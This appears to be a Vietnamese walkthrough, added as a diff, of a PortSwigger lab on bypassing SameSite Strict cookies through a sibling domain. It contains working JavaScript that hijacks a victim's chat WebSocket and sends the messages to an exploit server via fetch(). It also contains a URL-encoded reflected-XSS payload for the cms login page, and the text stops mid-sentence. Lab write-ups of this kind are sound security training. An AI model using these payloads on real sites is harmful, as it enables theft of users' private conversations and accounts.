@@ -1,0 +1,69 @@
+CSRF - SameSite Strict bypass via sibling domain
+
+End Goal:  To solve the lab, log in to the victim's account.
+
+Analystic
+---------
+Bước 1: Truy cập trình duyệt burp và vào link của lab, thực hiện chatlive và xem lại lịch sử 
+Bước 2:
+Ta thấy trong phần xác minh bắt tay để tạo websocket, có request như sau:
+GET /chat HTTP/2
+Host: 0a29005904eda0d880d78a11006500c8.web-security-academy.net
+Connection: Upgrade
+Pragma: no-cache
+Cache-Control: no-cache
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.59 Safari/537.36
+Upgrade: websocket
+Origin: https://0a29005904eda0d880d78a11006500c8.web-security-academy.net
+Sec-Websocket-Version: 13
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Cookie: session=Cfd1OtJiMmz2zGv1but5JoPH1ZbqsEpX
+Sec-Websocket-Key: rUFuZbOmw+Bura9LE5avGA==
+
+Ta thấy ở đây chỉ có phần cookie chứ k có csrf
+Bước 3: Trong phần history của websocket, ta thấy có 1 gói tin chứa nội dung READY, gửi nó tới repeater và thực hiện gửi đi --> nó sẽ hiển thị lại cho ta toàn bộ lịch sử cuộc trò chuyện 
+Bước 4: quay lại history, ta thấy ở request ở bước 2 có response như sau:
+HTTP/1.1 101 Switching Protocol
+Connection: Upgrade
+Upgrade: websocket
+Sec-WebSocket-Accept: B0o7uZy4UlQjU8ofoZ52kbkEXXM=
+Content-Length: 0
+
+ta thấy Connection của cả 2 bên đều Upgrade và máy chủ đủ tự động Switching Protocol sang websocket.
+Từ những điều trên có thể suy ra, nếu ta có được phiên của victim, ta có thể thực hiện mô phỏng 1 request để gửi tới server với nội dung của tin nhắn là READY để trích xuất toàn bộ lịch sử trò chuyện của victim.
+
+Bước 4: Tới exploit server, thực hiện mô phỏng lại reqeust của người dùng, ta có body request như sau:
+<script>
+var webSocket = new WebSocket(
+ "wss://0a29005904eda0d880d78a11006500c8.web-security-academy.net/chat"
+);
+
+webSocket.onopen = function(evt){
+ webSocket.send("READY");
+};
+
+webSocket.onmessage = function(evt){
+ var message = evt.data;
+ fetch("https://exploit-0a9e007b040ba03480e3890e0130006c.exploit-server.net/exploit?message=" +btoa(message));
+};
+</script>
+Sau khi gửi đi, khi user đã đăng nhập truy cập vào, ta sẽ có access log như sau:
+10.0.4.160      2024-10-29 08:47:29 +0000 "GET /exploit/ HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
+10.0.4.160      2024-10-29 08:47:29 +0000 "GET /exploit?message=eyJ1c2VyIjoiQ09OTkVDVEVEIiwiY29udGVudCI6Ii0tIE5vdyBjaGF0dGluZyB3aXRoIEhhbCBQbGluZSAtLSJ9 HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
+Ta thấy ở dòng thứ 2, message có giá trị được mã hóa base64 --> giả mã nó ta được thông điệp như sau:
+{"user":"CONNECTED","content":"-- Now chatting with Hal Pline --"
+Ta thấy nhân được thông báo mặc định khi người dùng sử dụng live chat --> yêu cầu của ta chỉ tương tự như 1 user chưa đăng nhập --> vì SameSite của web bằng Strict nên ta không lấy được sessionId của người dùng từ bên ngoài. 
+Bước 5: quay lại history, tìm lịch sử truy cập, tới phần /resources/js/chat.js, ta có response như sau:
+HTTP/2 200 OK
+Content-Type: application/javascript; charset=utf-8
+Cache-Control: public, max-age=3600
+Access-Control-Allow-Origin: https://cms-0a29005904eda0d880d78a11006500c8.web-security-academy.net
+ta truy cập vào tài nguyên này nhằm khởi tạo WebSocket cho phần livechat. 
+Access-Control-Allow-Origin: là một tiêu đề HTTP được sử dụng trong các phản hồi (response) để chỉ ra những nguồn gốc (origin) nào được phép truy cập vào tài nguyên đó. Đây là một phần quan trọng của chính sách Cross-Origin Resource Sharing (CORS) nhằm đảm bảo an toàn khi các trang web từ các miền khác nhau tương tác với nhau.
+ta thử truy cập vào miền này, sẽ hiện ra 1 trang web có 2 trường username và password, ở username thử nhập <script>alert(1)</script> và password nhập 123. Ta thấy trang có thể bị tấn công xss. Tiếp đến vào lại phần repsonse khi ta đăng nhập vào link này, ta gửi nó đến repeater và thực hiện change-method-request đổi nó thành GET rồi send, ta thấy vẫn chạy được. Ta thử mã hóa đoạn script của bước 4 thành URL sau đó thêm vào link của request GET, ta thấy web đã tạo được 1 websocket trong mã nhờ đoạn script. Từ đây ta có ý tưởng là vào expolit server, thêm nội dung vào body như sau:
+<script>
+document.location = "https://cms-0a29005904eda0d880d78a11006500c8.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%76%61%72%20%77%65%62%53%6f%63%6b%65%74%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%0a%20%22%77%73%73%3a%2f%2f%30%61%32%39%30%30%35%39%30%34%65%64%61%30%64%38%38%30%64%37%38%61%31%31%30%30%36%35%30%30%63%38%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%22%0a%29%3b%0a%0a%77%65%62%53%6f%63%6b%65%74%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%74%29%7b%0a%20%77%65%62%53%6f%63%6b%65%74%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%7d%3b%0a%0a%77%65%62%53%6f%63%6b%65%74%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%74%29%7b%0a%20%76%61%72%20%6d%65%73%73%61%67%65%20%3d%20%65%76%74%2e%64%61%74%61%3b%0a%20%66%65%74%63%68%28%22%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%39%65%30%30%37%62%30%34%30%62%61%30%33%34%38%30%65%33%38%39%30%65%30%31%33%30%30%30%36%63%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%6d%65%73%73%61%67%65%3d%22%20%2b%62%74%6f%61%28%6d%65%73%73%61%67%65%29%29%3b%0a%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=123";
+</script>
+Mục tiêu là ta sẽ gửi request này tới server, khi user truy cập vào, nó sẽ tạo 1 websocket.
+Khi này ta sẽ gửi cho người dùng, khi người dùng cố gắng thực hiện 1 chatlive thì 1 socket sẽ tạo và 
